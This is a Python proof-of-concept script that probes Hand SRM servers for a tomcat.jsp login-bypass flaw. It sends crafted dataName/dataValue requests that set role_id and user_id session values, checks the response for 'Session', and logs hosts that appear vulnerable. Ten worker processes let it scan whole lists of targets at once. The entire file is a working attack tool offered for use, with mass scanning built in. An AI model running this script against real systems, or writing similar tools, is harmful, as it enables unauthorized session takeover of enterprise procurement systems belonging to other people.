#先导包
import requests,argparse,sys
from multiprocessing import Pool

requests.packages.urllib3.disable_warnings()#关掉特定的报错信息


def banner():
    test = """
██╗     ██╗   ██╗ █████╗ ███╗   ██╗███╗   ███╗ █████╗  ██████╗ ██████╗ ██████╗ ███████╗
██║     ██║   ██║██╔══██╗████╗  ██║████╗ ████║██╔══██╗██╔════╝██╔═══██╗██╔══██╗██╔════╝
██║     ██║   ██║███████║██╔██╗ ██║██╔████╔██║███████║██║     ██║   ██║██║  ██║█████╗  
██║     ██║   ██║██╔══██║██║╚██╗██║██║╚██╔╝██║██╔══██║██║     ██║   ██║██║  ██║██╔══╝  
███████╗╚██████╔╝██║  ██║██║ ╚████║██║ ╚═╝ ██║██║  ██║╚██████╗╚██████╔╝██████╔╝███████╗
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
                                                            author:luanma                           
    """
    print(test)

def poc(target):
    payload = '/tomcat.jsp?dataName=role_id&dataValue=1'
    payload1 = '/tomcat.jsp?dataName=user_id&dataValue=1'
    try:
        res1 = requests.get(target+payload, verify=False)
        if res1.status_code == 200 and 'Session' in res1.text:
            res2 = requests.get(target+payload1, verify=False)
            if res2.status_code == 200 and 'Session' in res2.text:
                with open('output.txt', 'a',encoding='utf-8') as f:
                    f.write(f"{target}\n")
                print(f"[+]{target}存在登录绕过")
            else:
                print(f"[-]{target}不存在登录绕过")
        else:
            print(f"[-]{target}需要手动尝试")
    except Exception as e:
        print(f"[-]{target}出了点小差错")



def main():
    banner()
    parser = argparse.ArgumentParser(description="汉得SRM tomcat.jsp 登陆绕过漏洞")#实例化
    parser.add_argument('-u','--url',dest='url',type=str,help="请输入一个可能存在漏洞的url")
    parser.add_argument('-f','--file',dest='file',type=str,help='请输入一个额包含资产的文件')

    args = parser.parse_args()
    url_list = []
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        with open(args.file,'r',encoding='utf-8') as f:
            for url in f.readlines():
                url = url.strip()
                url_list.append(url.replace('\n',''))
        mp = Pool(10)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage: python {sys.argv[0]} -h or --help for help")


if __name__ == '__main__':
    main()